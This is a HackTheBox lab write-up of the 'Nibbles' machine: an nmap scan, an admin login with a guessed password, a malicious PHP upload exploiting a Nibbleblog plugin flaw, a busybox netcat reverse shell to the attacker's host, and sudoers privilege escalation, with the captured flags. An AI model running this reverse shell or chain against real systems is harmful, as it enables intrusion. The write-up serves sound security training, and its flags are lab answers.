---
layout: /src/layouts/MarkdownPostLayout_HTB.astro
title: Nibbles HackTheBox Write-Up
author: Adrian Reategui
description: ""
image:
  url: "/images/posts/nibbles_bg.png"
  alt: ""
pubDate: 2025-06-14
tags:
  ["hackthebox", "machine", "writeup", "linux"]
languages: []
---

### SUMMARY
> This machine only had 2 open ports, on port 80 we found a nibble blog and when fuzzing we found an admin panel. Looking for vulnerabiltiies or sqli I couldnt find anything interesting to exploit the admin panel, however when tryin admin as the username and nibbles as the password I was able to login. Once inside nibbleblog was vulnerable to a malicious file upload trough the plugin "my_image". I then uploaded a cmd.php file with malicious code and I was able to retrieve the file from {URL}/content/private/plugins/my_image/image.php. Here I was able to execute commands and gained access to the system as the user nibbler. This user had a especial permisison that allowed him to execute a script inside his home directory as the user root, since the user was the propietary and had write permission on the script I then decided to add the user nibbler to the sudoers file and made him able to execute any command as any user so I could spawn a shell as the user root.

#Lecciones : En CTF's donde la maquina victima tiene un nombre y encontremos un panel de login es importante utilizar el nombre de la maquina para intentar usarla como usuario, password o ambos, en este caso el usuario era admin y la contrasena nibbles
### NMAP
- Nmap scan
	```
		# Nmap 7.95 scan initiated Sat Apr 26 14:50:36 2025 as: /usr/lib/nmap/nmap --privileged -sCV -p22,80 -oN targeted 10.10.10.75
	Nmap scan report for 10.10.10.75
	Host is up (0.28s latency).
	
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
	|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
	|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
	80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
	|_http-title: Site doesn't have a title (text/html).
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	# Nmap done at Sat Apr 26 14:50:59 2025 -- 1 IP address (1 host up) scanned in 22.97 seconds
	```
### FOOTHOLD
- On the web page on port 80 when inspecting the url-code I found a route to nibbleblog
	![alt](/images/posts/nibbles2.webp)
- I then access to the nibbleblog directory where I couldnt find anything interesting
	![alt](/images/posts/nibbles3.webp)
- I then fuzzed the webpage to find directories and found an admin.php
	![alt](/images/posts/nibbles4.webp)
- When accessing to the admin.php I found an admin panel
	![alt](/images/posts/nibbles5.webp)
- I tried default credentials but they weren't working so I decided to try admin as the username an nibbles (the machine name) as the password being able to access to the administrator panel
	```
		username: admin
		password: nibbles
	```
	![alt](/images/posts/nibbles6.webp)
- By doing a bit of research I found that nibbleblog was vulnerable to a malicious file upload 
	![alt](/images/posts/nibbles7.webp)
- The vuilnerability can be exploited by abusing the my_image plugin file upload, read more [HERE](https://nvd.nist.gov/vuln/detail/CVE-2015-6967). S since we had access I decided to upload a malicious cmd.php file
	![alt](/images/posts/nibbles8.webp)
- I uploaded a cmd.php file that was successfully uploaded, so in order to access to it I had to go to  {URL}/content/private/plugins/my_image/image.php.
	![alt](/images/posts/nibbles9.webp)
- I then started a netcat listener on port 443 and send a revershell to my kali machine by using busybox
	```
	busybox nc 10.10.14.22 443 -e sh
	```
	![alt](/images/posts/nibbles10.webp)
### LOCAL
- Once inside the system I was able to read the user flag, I decided to put my public key in order to connect trough ssh
	```
		nibbler@Nibbles:~$ whoami ; ifconfig ; cat /home/nibbler/user.txt
	nibbler
	ens192    Link encap:Ethernet  HWaddr 00:50:56:94:dc:a5  
	          inet addr:10.10.10.75  Bcast:10.10.10.255  Mask:255.255.255.0
	          inet6 addr: fe80::250:56ff:fe94:dca5/64 Scope:Link
	          inet6 addr: dead:beef::250:56ff:fe94:dca5/64 Scope:Global
	          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
	          RX packets:4247 errors:0 dropped:10 overruns:0 frame:0
	          TX packets:4918 errors:0 dropped:0 overruns:0 carrier:0
	          collisions:0 txqueuelen:1000 
	          RX bytes:517921 (517.9 KB)  TX bytes:1067133 (1.0 MB)
	
	lo        Link encap:Local Loopback  
	          inet addr:127.0.0.1  Mask:255.0.0.0
	          inet6 addr: ::1/128 Scope:Host
	          UP LOOPBACK RUNNING  MTU:65536  Metric:1
	          RX packets:216 errors:0 dropped:0 overruns:0 frame:0
	          TX packets:216 errors:0 dropped:0 overruns:0 carrier:0
	          collisions:0 txqueuelen:1 
	          RX bytes:17384 (17.3 KB)  TX bytes:17384 (17.3 KB)
	
	a7e55c86d7ffe7dfa22fcf3aae949f40
	```
### PRIVILEGE ESCALATION
- When lsiting users privileges I found the user nibbler was able to execute a script as the user root
	![alt](/images/posts/nibbles11.webp)
- The script was inside a zip file that I was able to extract and when lsiitng the script permissions I was teh owner and I could write on it
	![alt](/images/posts/nibbles12.webp)
- I then changed the name of the script monitor.sh and create a new one with the following instructions
	![alt](/images/posts/nibbles13.webp)
- I then ran the script as the user root and I successfully added the user nibbles to the sudoers file
	![alt](/images/posts/nibbles14.webp)
### ROOT
- I then spawn a shell as the user root and read the root flag
	```bash
		nibbler@Nibbles:~/personal/stuff$ sudo -u root bash
	```
	```
	root@Nibbles:~/personal/stuff# whoami ; ifconfig ; cat /root/root.txt
	root
	ens192    Link encap:Ethernet  HWaddr 00:50:56:94:dc:a5  
	          inet addr:10.10.10.75  Bcast:10.10.10.255  Mask:255.255.255.0
	          inet6 addr: fe80::250:56ff:fe94:dca5/64 Scope:Link
	          inet6 addr: dead:beef::250:56ff:fe94:dca5/64 Scope:Global
	          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
	          RX packets:4636 errors:0 dropped:10 overruns:0 frame:0
	          TX packets:5253 errors:0 dropped:0 overruns:0 carrier:0
	          collisions:0 txqueuelen:1000 
	          RX bytes:552041 (552.0 KB)  TX bytes:1103323 (1.1 MB)
	
	lo        Link encap:Local Loopback  
	          inet addr:127.0.0.1  Mask:255.0.0.0
	          inet6 addr: ::1/128 Scope:Host
	          UP LOOPBACK RUNNING  MTU:65536  Metric:1
	          RX packets:216 errors:0 dropped:0 overruns:0 frame:0
	          TX packets:216 errors:0 dropped:0 overruns:0 carrier:0
	          collisions:0 txqueuelen:1 
	          RX bytes:17384 (17.3 KB)  TX bytes:17384 (17.3 KB)
	
	092b5f313b1b539c9b6a4674ef514e81
	```

